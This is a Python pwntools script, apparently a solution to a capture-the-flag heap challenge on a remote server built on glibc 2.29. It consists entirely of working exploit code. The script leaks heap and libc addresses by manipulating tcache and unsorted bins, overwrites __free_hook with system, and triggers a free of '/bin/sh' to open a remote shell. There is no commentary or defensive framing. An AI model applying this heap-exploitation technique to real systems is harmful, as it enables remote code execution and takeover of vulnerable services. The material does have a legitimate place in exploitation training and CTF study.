from pwn import *

###Util
def create(size,data):
    r.sendlineafter('choice: ','1')
    r.sendlineafter('size: ',str(size))
    r.sendafter('content: ',data)

def delete():
    r.sendlineafter('choice: ','2')

def show():
    r.sendlineafter('choice: ','3')
    return r.recvuntil('\n\n',drop=True)[9:]

###Addr
#  libc2.29
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset+0x60
free_hook_offset = 0x1e75a8
system_offset = 0x52fd0

###Exploit
r = remote('nc.eonew.cn',10007)

create(0xf8,'M30W')
delete()
create(0x18,'M30W')
delete()
create(0x108,'M30W')
delete()
create(0x18,'a'*0x18)
delete()
create(0x108,'M30W')
delete()
heap_addr = u64(show().ljust(8,b'\x00'))-0x260
print(hex(heap_addr))

for i in range(5):
    create(0x28+0x10*i,'M30W')
    delete()
    create(0x108,'M30W')
    delete()
    create(0x28+0x10*i,'a'*(0x28+0x10*i))
    delete()
    create(0x108,'M30W')
    delete()

create(0x78,'M30W')
delete()
create(0x118,'M30W')
delete()
create(0x78,b'\x00'*0x10+p64(heap_addr+0xb80)+p64(0x61)+p64(heap_addr+0xb68)+p64(heap_addr+0xb70)+b'\x00'*0x40+p64(0x60))
delete()
create(0x118,b'\x00'*0xf8+p64(0x21))
delete()
create(0x158,'M30W')
delete()
create(0x78,b'\x00'*0x18+p64(0x101)+p64(0)+p64(0))
delete()
create(0x158,b'\x00'*0xf8+p64(0x61))
delete()
unsorted_bin_addr = u64(show()+b'\x00\x00')
libc_base = unsorted_bin_addr-unsorted_bin_offset
print(hex(libc_base))

for i in range(8):
    create(0xf8,'M30W')
delete()
create(0x78,b'\x00'*0x20+p64(libc_base+free_hook_offset-0x8))
create(0xf8,'M30W')
create(0xf8,b'/bin/sh\x00'+p64(libc_base+system_offset))
input()
delete()

r.interactive()
